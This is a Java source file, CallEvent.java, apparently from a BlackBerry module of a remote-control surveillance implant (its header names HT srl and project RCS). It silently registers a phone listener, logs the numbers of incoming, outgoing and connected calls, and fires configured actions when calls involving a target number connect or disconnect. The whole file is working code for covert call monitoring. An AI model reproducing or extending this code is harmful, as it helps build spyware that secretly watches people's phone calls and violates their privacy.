//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;
import java.util.Hashtable;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class CallEvent.
 */
public final class CallEvent extends Event implements PhoneListener {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallEvent", DebugLevel.VERBOSE);
    //#endif

    String number;
    int actionOnEnter;
    int actionOnExit;

    /**
     * Instantiates a new call event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public CallEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_CALL, actionId, confParams, "CallEvent");
        setPeriod(NEVER);
    }

    protected void actualStart() {
        Phone.addPhoneListener(this);
    }

    protected void actualStop() {
        Phone.removePhoneListener(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();

            final int len = databuffer.readInt();
            final byte[] array = new byte[len];
            databuffer.read(array);
            number = WChar.getString(array, true);

        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG
        debug.info("number: " + number);
        //#endif

        return true;
    }

    Hashtable callingHistory = new Hashtable();

    public void callConnected(int callId) {
        init();

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
        final boolean outgoing = phoneCall.isOutgoing();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }

        if (number.length() == 0 || phoneNumber.endsWith(number)) {
            trigger(actionOnEnter);
        }
    }

    public void callDisconnected(int callId) {
        init();

        final PhoneCall phoneCall = Phone.getCall(callId);
        String phoneNumber = null;

        if (phoneCall != null) {

            phoneNumber = phoneCall.getDisplayPhoneNumber();
            //outgoing = phoneCall.isOutgoing();

        } else {

            synchronized (callingHistory) {
                if (callingHistory.containsKey(new Integer(callId))) {
                    phoneNumber = (String) callingHistory.get(new Integer(
                            callId));
                    callingHistory.remove(new Integer(callId));
                }
            }

            //#ifdef DEBUG
            debug.trace("callDisconnected phoneNumber: " + phoneNumber);
            //#endif
        }

        if (number.length() == 0 || phoneNumber.endsWith(number)) {
            trigger(actionOnExit);
        }
    }

    public void callIncoming(int callId) {
        init();

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }
    }

    public void callInitiated(int callId) {
        init();

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }
    }

    public void callAdded(int callId) {
        // TODO Auto-generated method stub

    }

    public void callAnswered(int callId) {
        // TODO Auto-generated method stub

    }

    public void callConferenceCallEstablished(int callId) {
        // TODO Auto-generated method stub

    }

    public void callDirectConnectConnected(int callId) {
        // TODO Auto-generated method stub

    }

    public void callDirectConnectDisconnected(int callId) {
        // TODO Auto-generated method stub

    }

    public void callEndedByUser(int callId) {
        // TODO Auto-generated method stub

    }

    public void callFailed(int callId, int reason) {
        // TODO Auto-generated method stub

    }

    public void callHeld(int callId) {
        // TODO Auto-generated method stub

    }

    public void callRemoved(int callId) {
        // TODO Auto-generated method stub

    }

    public void callResumed(int callId) {
        // TODO Auto-generated method stub

    }

    public void callWaiting(int callid) {
        // TODO Auto-generated method stub

    }

    public void conferenceCallDisconnected(int callId) {
        // TODO Auto-generated method stub

    }
    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }
}
